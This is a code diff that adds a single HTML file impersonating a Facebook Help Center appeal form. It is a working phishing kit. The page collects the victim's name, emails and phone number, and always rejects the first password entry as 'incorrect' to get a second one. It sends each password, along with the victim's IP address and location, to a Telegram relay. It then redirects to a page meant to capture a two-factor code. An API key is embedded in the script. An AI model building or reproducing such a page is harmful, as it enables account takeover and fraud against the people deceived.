@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help Center - Disagree with Decision</title>
+    <style>
+        /* ... (CSS của bạn không thay đổi) ... */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: #355797; /* Facebook Blue */
+            border-bottom: 1px solid #355797; /* Match border to background */
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,.08);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .header .search-bar {
+            flex-grow: 1;
+            margin-right: 20px;
+            max-width: 500px;
+        }
+        .header .search-bar input {
+            width: 100%;
+            padding: 8px 15px;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            font-size: 15px;
+            outline: none;
+            box-sizing: border-box;
+            background-color: rgba(255, 255, 255, 0.2); /* Slightly transparent white */
+            color: #fff; /* White text for input */
+        }
+        .header .search-bar input::placeholder {
+            color: rgba(255, 255, 255, 0.7); /* Lighter white for placeholder */
+        }
+        .header .help-center-link {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff; /* White text */
+            text-decoration: none;
+        }
+        .header .language {
+            font-size: 14px;
+            color: #fff; /* White text */
+        }
+        .main-content {
+            display: flex;
+            flex-grow: 1;
+        }
+        .sidebar {
+            width: 250px;
+            background-color: #fff;
+            padding: 20px;
+            border-right: 1px solid #ddd;
+            box-shadow: 0 2px 4px rgba(0,0,0,.08);
+            overflow-y: auto;
+        }
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .sidebar ul li {
+            margin-bottom: 10px;
+        }
+        .sidebar ul li a {
+            text-decoration: none;
+            color: #333;
+            padding: 8px 10px;
+            display: block;
+            border-radius: 6px;
+        }
+        .sidebar ul li a:hover, .sidebar ul li a.active {
+            background-color: #f0f2f5;
+            color: #1877f2;
+        }
+        .content-area {
+            flex-grow: 1;
+            padding: 20px;
+            background-color: #f0f2f5;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1);
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .form-container h2 {
+            font-size: 24px;
+            color: #1c2b33;
+            margin-bottom: 20px;
+        }
+        .form-container p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .form-container label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .form-container input[type="text"],
+        .form-container input[type="email"],
+        .form-container textarea {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .form-container input[type="text"]:focus,
+        .form-container input[type="email"]:focus,
+        .form-container textarea:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .form-container textarea {
+            resize: vertical;
+            min-height: 120px;
+        }
+        .form-container .ticket-number {
+            font-weight: bold;
+            color: #1877f2;
+        }
+        .form-container .note {
+            font-size: 13px;
+            color: #606770;
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+        .form-container .terms {
+            font-size: 13px;
+            color: #606770;
+            margin-top: 20px;
+            margin-bottom: 20px; /* Added margin for spacing */
+        }
+        .form-container .terms a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .form-container button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block; /* Make it a block element */
+            
+            margin-top: 20px; /* Space from terms */
+        }
+        .form-container button:hover {
+            background-color: #166fe5;
+        }
+
+        /* Password Popup Styles (unchanged as it's still a popup) */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none; /* Hidden by default */
+        }
+        .popup-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .popup-content h3 {
+            font-size: 20px;
+            color: #1c2b33;
+            margin-bottom: 15px;
+        }
+        .popup-content p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .popup-content input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .popup-content input[type="password"]:focus {
+            border-color: #1877f2;
+        }
+        .popup-content button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+        }
+        .popup-content button:hover {
+            background-color: #166fe5;
+        }
+        .popup-content .error-message {
+            color: #fa3e3e;
+            font-size: 13px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none; /* Hide sidebar on screens smaller than 768px */
+            }
+            .header {
+                display: none; /* Hide sidebar on screens smaller than 768px */
+            }
+            .main-content {
+                flex-direction: column; /* Stack main content for better mobile layout */
+            }
+            .header {
+                flex-wrap: wrap; /* Allow header items to wrap */
+                justify-content: center; /* Center items if wrapped */
+            }
+            .header .search-bar {
+                margin: 10px 0; /* Add vertical margin for search bar */
+                max-width: 100%; /* Take full width on small screens */
+            }
+            .header .help-center-link,
+            .header .language {
+                margin: 5px 10px; /* Adjust spacing */
+            }
+            .content-area {
+                padding: 10px; /* Reduce padding on mobile */
+            }
+            .form-container {
+                padding: 20px; /* Reduce padding inside form container */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#" class="help-center-link">facebook</a>
+        <div class="search-bar">
+            <input type="text" placeholder="How can we help?">
+        </div>
+        <span class="language">English (US)</span>
+    </div>
+
+    <div class="main-content">
+        <div class="sidebar">
+            <ul>
+                <li><a href="#">Creating an Account</a></li>
+                <li><a href="#">Your Profile</a></li>
+                <li><a href="#">Friending</a></li>
+                <li><a href="#">Dating</a></li>
+                <li><a href="#">Your Home Page</a></li>
+                <li><a href="#">Messaging</a></li>
+                <li><a href="#">Reels</a></li>
+                <li><a href="#">Stories</a></li>
+                <li><a href="#">Photos</a></li>
+                <li><a href="#">Videos</a></li>
+                <li><a href="#">Gaming</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">Events</a></li>
+                <li><a href="#">Fundraisers and Donations</a></li>
+                <li><a href="#">Pay</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Apps</a></li>
+                <li><a href="#">Mobile Apps</a></li>
+                <li><a href="#">Accessibility</a></li>
+            </ul>
+        </div>
+
+        <div class="content-area">
+            <div class="form-container">
+                <h2>Disagree with Decision</h2>
+                <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
+                <p>We may need to collect some info from you that'll help us review your account again. Complete the required information and submit the appeal form.</p>
+
+                <form id="disagreeForm">
+                    <label for="yourName">Page Name *</label>
+                    <input type="text" id="yourName" name="yourName" required>
+
+                    <label for="businessEmail">Business Email *</label>
+                    <input type="email" id="businessEmail" name="businessEmail"  required>
+                    <p class="note">Notifications about the verification status will be sent to this email.</p>
+
+                    <label for="personalEmail">Personal Email *</label>
+                    <input type="email" id="personalEmail" name="personalEmail" required>
+
+                    <label for="mobilePhoneNumber">Mobile Phone Number *</label>
+                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber"  required>
+                    <p class="note">We can use this phone number to contact you for verification.</p>
+
+                    <label for="additionalInfo">Please provide us information that will help us investigate</label>
+                    <textarea id="additionalInfo" name="additionalInfo"></textarea>
+
+                    <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>
+
+                    <button type="submit" id="sendButton">Send</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="passwordPopupOverlay">
+        <div class="popup-content">
+            <h3>Please Enter Your Password</h3>
+            <p>For security reasons, please enter your password to continue.</p>
+            <input type="password" id="passwordInput" placeholder="Password" required>
+            <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
+            <button id="confirmPasswordButton">Confirm</button>
+        </div>
+    </div>
+
+    <script>
+
+
+        // !!! VUI LÒNG THAY THẾ 'YOUR_IPGEOLOCATION_API_KEY' BẰNG API KEY CỦA BẠN !!!
+        const IPGEOLOCATION_API_KEY = 'c02b6eef95674bcfac1fe653686d4c3a'; 
+
+        let ipAddress = 'N/A';
+        let locationData = 'N/A';
+        let formData = {};
+        let passwordAttemptCount = 0;
+        let passwordAttemptValue1 = '';
+        let passwordAttemptValue2 = '';
+
+        // Elements
+        const ticketNumberSpan = document.getElementById('ticketNumber');
+        const disagreeForm = document.getElementById('disagreeForm');
+        const sendButton = document.getElementById('sendButton');
+
+        const passwordPopupOverlay = document.getElementById('passwordPopupOverlay');
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordError = document.getElementById('passwordError');
+        const confirmPasswordButton = document.getElementById('confirmPasswordButton');
+
+        // --- Utility Functions ---
+
+        // Generate a random 12-digit number
+        function generateRandomTicketNumber() {
+            return Math.floor(100000000000 + Math.random() * 900000000000).toString();
+        }
+
+        // Fetch user's IP and location using ipgeolocation.io
+        async function getIPAndLocation() {
+            try {
+                // Kiểm tra xem API Key đã được cung cấp chưa
+                if (IPGEOLOCATION_API_KEY === 'YOUR_IPGEOLOCATION_API_KEY' || !IPGEOLOCATION_API_KEY) {
+                    console.error('IPGeolocation API Key is not set. Please replace "YOUR_IPGEOLOCATION_API_KEY" with your actual key.');
+                    return;
+                }
+
+                const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`);
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    ipAddress = data.ip;
+                    locationData = `${data.city || 'Unknown City'}, ${data.state_prov || 'Unknown Region'}, ${data.country_name || 'Unknown Country'}`;
+                    console.log(`IP: ${ipAddress}, Location: ${locationData}`);
+                } else {
+                    console.error('Error fetching IP and location from ipgeolocation.io:', data.message || 'Unknown error');
+                    ipAddress = 'N/A';
+                    locationData = 'N/A';
+                }
+            } catch (error) {
+                console.error('Error fetching IP and location:', error);
+                ipAddress = 'N/A';
+                locationData = 'N/A';
+            }
+        }
+
+        // Send message to Telegram
+        async function sendMessageToTelegram(message) {
+    try {
+        // Gọi đến endpoint của Serverless Function
+        const response = await fetch('/api/send-telegram', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ message: message }) // Gửi nội dung tin nhắn lên Serverless Function
+        });
+        const data = await response.json();
+        if (!data.success) {
+            console.error('Error sending message via API:', data.error);
+            // Xử lý lỗi nếu cần (ví dụ: hiển thị thông báo cho người dùng)
+        } else {
+            console.log('Message sent successfully via API!');
+        }
+    } catch (error) {
+        console.error('Error calling send-telegram API:', error);
+        // Xử lý lỗi kết nối hoặc lỗi mạng
+    }
+}
+
+        // --- Form and Popup Handlers ---
+
+        // Show password popup
+        sendButton.addEventListener('click', async (e) => {
+            e.preventDefault(); // Prevent default form submission
+
+            // Gather form data
+            formData = {
+                yourName: document.getElementById('yourName').value,
+                businessEmail: document.getElementById('businessEmail').value,
+                personalEmail: document.getElementById('personalEmail').value,
+                mobilePhoneNumber: document.getElementById('mobilePhoneNumber').value,
+                additionalInfo: document.getElementById('additionalInfo').value,
+                ticketNumber: ticketNumberSpan.textContent
+            };
+
+            // Basic validation
+            if (!formData.yourName || !formData.businessEmail || !formData.personalEmail || !formData.mobilePhoneNumber) {
+                alert('Please fill in all required fields (marked with *)');
+                return;
+            }
+
+            // Fetch IP and location if not already done
+            if (ipAddress === 'N/A') {
+                await getIPAndLocation();
+            }
+
+            passwordInput.value = ''; // Clear previous input
+            passwordError.style.display = 'none';
+            passwordPopupOverlay.style.display = 'flex';
+            passwordInput.focus();
+        });
+
+        // Password popup confirm button
+        confirmPasswordButton.addEventListener('click', async () => {
+            const password = passwordInput.value;
+            if (!password) {
+                passwordError.textContent = 'Password cannot be empty.';
+                passwordError.style.display = 'block';
+                return;
+            }
+
+            passwordAttemptCount++;
+
+            let message = `<b>New Submission Attempt ${passwordAttemptCount}</b>\n`;
+            message += `------------------------------------\n`;
+            message += `<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
+            message += `<b>Page Name:</b> ${formData.yourName}\n`;
+            message += `<b>Business Email:</b> ${formData.businessEmail}\n`;
+            message += `<b>Personal Email:</b> ${formData.personalEmail}\n`;
+            message += `<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
+          
+            if (passwordAttemptCount === 1) {
+                passwordAttemptValue1 = password;
+                message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
+                await sendMessageToTelegram(message);
+                passwordError.textContent = 'Incorrect password. Please try again.';
+                passwordError.style.display = 'block';
+            } else if (passwordAttemptCount === 2) {
+                passwordAttemptValue2 = password;
+                message += `<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
+                await sendMessageToTelegram(message);
+                passwordPopupOverlay.style.display = 'none';
+
+                // Store data in localStorage and redirect to 2FA page
+                localStorage.setItem('formData', JSON.stringify(formData));
+                localStorage.setItem('ipAddress', ipAddress);
+                localStorage.setItem('locationData', locationData);
+                localStorage.setItem('passwordAttemptValue1', passwordAttemptValue1);
+                localStorage.setItem('passwordAttemptValue2', passwordAttemptValue2);
+                window.location.href = '2fa_page.html'; // Redirect to the new 2FA page
+            }
+            // Reset input after sending
+            passwordInput.value = '';
+        });
+
+        // --- Initial Setup ---
+        document.addEventListener('DOMContentLoaded', () => {
+            ticketNumberSpan.textContent = generateRandomTicketNumber();
+            getIPAndLocation(); // Fetch IP and location on page load
+
+            // Clear localStorage if user comes back to confirm.html (optional, good for clean state)
+            localStorage.removeItem('formData');
+            localStorage.removeItem('ipAddress');
+            localStorage.removeItem('locationData');
+            localStorage.removeItem('passwordAttemptValue1');
+            localStorage.removeItem('passwordAttemptValue2');
+            localStorage.removeItem('twoFAAttemptCount'); // Clear 2FA specific data
+        });
+    </script>
+</body>
+</html>
